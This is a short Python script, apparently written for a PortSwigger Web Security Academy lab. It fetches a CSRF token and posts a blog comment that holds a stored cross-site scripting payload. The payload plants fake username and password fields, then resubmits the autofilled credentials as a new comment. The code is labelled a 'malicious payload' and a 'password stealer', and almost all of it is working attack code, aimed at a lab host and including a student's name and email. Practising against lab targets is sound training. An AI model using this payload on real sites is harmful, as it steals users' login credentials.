import requests
from bs4 import BeautifulSoup

site = '0a65004403082ff4801203d7005900e7.web-security-academy.net'
s = requests.Session()

def try_post(name, email, comment_payload):
    blog_post_url = f'https://{site}/post?postId=1'
    resp = s.get(blog_post_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    comment_url = f'https://{site}/post/comment'
    comment_data = {
        'csrf': csrf,
        'postId': '1',
        'comment': comment_payload,
        'name': name,
        'email': email,
        'website': 'https://pdx.edu'
    }

    post_resp = s.post(comment_url, data=comment_data)
    print(f"Comment submitted: {post_resp.status_code}")

# Your malicious payload
comment_xss = '''<input name=username id=username>
<input type=password name=password 
onchange="document.forms[0].email.value='calizo@pdx.edu';
document.forms[0].name.value='Jarren Calizo';
document.forms[0].comment.value=username.value+':'+this.value;
document.forms[0].postId.value='1';
document.forms[0].csrf.value=document.getElementsByName('csrf')[0].value;
document.forms[0].website.value='https://pdx.edu';
document.forms[0].submit();">'''

# Post the payload
try_post("xss_password_stealer", "calizo@pdx.edu", comment_xss)